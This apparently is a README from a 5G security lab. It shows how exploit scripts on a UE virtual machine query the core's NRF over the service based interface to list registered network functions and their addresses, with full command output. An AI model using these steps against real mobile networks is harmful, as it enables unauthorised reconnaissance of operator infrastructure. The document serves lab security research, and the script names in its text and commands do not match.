# The service based interface as an attack vector

## Finding functions of IP addresses 

After a succesfull NMAP scan you probably have a range of ip addresses that you suspect to be a NFs. You can use the SBI to find out which is a NRF and from there what the other NFs are.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./find_nrf.sh -n <list of suspected nrfs> -i <interface>
```

## Checking NFs

If you ask the nrf it will respond with all the registered nfs.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./nr-binder 10.45.0.29 nghttp http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances
{
	"_links":	{
		"items":	[{
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4424e10c-b91f-41ed-b63c-6de5d08235f5"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/(null)"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43d16e14-b91f-41ed-b49c-f98481dc4b43"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/44cae8fe-b91f-41ed-b183-37f999dfcad0"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/443fb23e-b91f-41ed-a76b-27c3b6dd6eb0"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4480ec36-b91f-41ed-bbb3-f312db251f3b"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/445bb7a4-b91f-41ed-807f-159b80cdce04"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43ccaa6e-b91f-41ed-9c82-59e9ae72412b"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/44b4ba20-b91f-41ed-bcf2-15223ef57432"
			}, {
				"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/4495ab30-b91f-41ed-937f-9fe1903c6cb7"
			}],
		"self":	{
			"href":	"http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances"
		}
	}
}

```

Now we can check every indvidual uri and find out more about the NFs, here we choose a single href and see what we get.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$  ./nr-binder 10.45.0.29 nghttp http://10.0.8.1:7777/nnrf-nfm/v1/nf-instances/43ccaa6e-b91f-41ed-9c82-59e9ae72412b
{
	"nfInstanceId":	"43ccaa6e-b91f-41ed-9c82-59e9ae72412b",
	"nfType":	"AMF",
	"nfStatus":	"REGISTERED",
	"heartBeatTimer":	10,
	"ipv4Addresses":	["10.0.3.1"],
	"allowedNfTypes":	["SMF", "SCP"],
	"priority":	0,
	"capacity":	100,
	"load":	0,
	"nfServiceList":	{
		"43ccd6d8-b91f-41ed-9c82-59e9ae72412b":	{
			"serviceInstanceId":	"43ccd6d8-b91f-41ed-9c82-59e9ae72412b",
			"serviceName":	"namf-comm",
			"versions":	[{
					"apiVersionInUri":	"v1",
					"apiFullVersion":	"1.0.0"
				}],
			"scheme":	"http",
			"nfServiceStatus":	"REGISTERED",
			"ipEndPoints":	[{
					"ipv4Address":	"10.0.3.1",
					"port":	7777
				}],
			"allowedNfTypes":	["SMF"],
			"priority":	0,
			"capacity":	100,
			"load":	0
		}
	},
	"nfProfileChangesSupportInd":	true
}
```

The script ```find_nfs.sh``` does the top two actions together, requests the nrf for all registered nfs and then asks for more information on each.

```console
user@ue_vm:~/5G/UE_VM/Exploit_Scripts/SBI$ ./check_nr.sh -n <nrf_ip> -i <interface>
```

Now we have the addresses functions and various other information of all NFs connected to the nrf.
